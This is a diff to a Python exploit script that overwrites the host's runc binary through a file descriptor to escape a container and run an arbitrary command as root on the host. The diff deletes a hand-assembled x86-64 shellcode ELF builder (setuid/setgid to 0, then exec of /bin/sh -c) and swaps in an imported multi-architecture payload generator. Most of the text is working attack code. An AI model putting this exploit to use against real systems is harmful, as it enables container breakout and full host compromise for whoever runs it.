@@ -1,59 +1,15 @@
 #!/usr/bin/env python3
 import os
 import shlex
-import struct
 import sys
 
 from copyfail_primitive import copy_fail_fd
+from elf_payloads import host_cmd_payload, native_arch, normalize_arch
 
 
 def round4(n):
     return (n + 3) & ~3
 
-
-def elf_payload(cmd: str) -> bytes:
-    code = bytearray()
-    fixups = []
-
-    def emit(b):
-        code.extend(b)
-
-    def lea(modrm, label):
-        pos = len(code)
-        emit(b"\x48\x8d" + bytes([modrm]) + b"\0\0\0\0")
-        fixups.append((pos + 3, label, pos + 7))
-
-    emit(b"\x31\xff\x6a\x69\x58\x0f\x05")  # setuid(0)
-    emit(b"\x31\xff\x6a\x6a\x58\x0f\x05")  # setgid(0)
-    lea(0x3D, "self_exe")
-    emit(b"\x31\xf6\x31\xd2\x6a\x02\x58\x0f\x05")  # open("/proc/self/exe", O_RDONLY)
-    emit(b"\x48\x89\xc7\x6a\x09\x5e\x6a\x21\x58\x0f\x05")  # dup2(fd, 9)
-    lea(0x3D, "sh")
-    lea(0x1D, "dash_c")
-    lea(0x0D, "cmd")
-    emit(b"\x31\xd2\x52\x51\x53\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05")
-    emit(b"\x31\xff\x6a\x3c\x58\x0f\x05")
-
-    labels = {"sh": len(code)}
-    emit(b"/bin/sh\0")
-    labels["dash_c"] = len(code)
-    emit(b"-c\0")
-    labels["self_exe"] = len(code)
-    emit(b"/proc/self/exe\0")
-    labels["cmd"] = len(code)
-    emit(cmd.encode() + b"\0")
-
-    for at, label, next_ip in fixups:
-        code[at : at + 4] = struct.pack("<i", labels[label] - next_ip)
-
-    off = 0x78
-    size = off + len(code)
-    eh = bytearray(0x40)
-    eh[:16] = b"\x7fELF\x02\x01\x01" + b"\0" * 9
-    struct.pack_into("<HHIQQQIHHHHHH", eh, 16, 2, 0x3E, 1, 0x400000 + off, 0x40, 0, 0, 0x40, 0x38, 1, 0, 0, 0)
-    ph = bytearray(0x38)
-    struct.pack_into("<IIQQQQQQ", ph, 0, 1, 5, 0, 0x400000, 0x400000, size, size, 0x1000)
-    return bytes(eh + ph + code)
 
 if len(sys.argv) < 5:
     raise SystemExit(f"usage: {sys.argv[0]} RUNC_FD CONTAINER_OUT MARKER_PATH MARKER_TOKEN [host-command [args...]]")
@@ -117,7 +73,8 @@ cmd = (
     f"printf '%s\\n' \"$rc\" > \"$out.done\"; "
     f"chmod 644 \"$out.done\""
 )
-payload = elf_payload(cmd)
+arch = normalize_arch(os.environ.get("DCF_PAYLOAD_ARCH") or native_arch())
+payload = host_cmd_payload(cmd, arch)
 backup_len = round4(len(payload))
 fd = os.open(runc_fd_path, os.O_RDONLY)
 try:
@@ -128,7 +85,7 @@ try:
         f.write(original)
     os.chmod(backup, 0o644)
     print(
-        f"patching {runc_fd_path} target={runc_target} payload={len(payload)} backup={backup_len} "
+        f"patching {runc_fd_path} target={runc_target} arch={arch} payload={len(payload)} backup={backup_len} "
         f"out=/proc/*/root{out} command={host_command}",
         flush=True,
     )
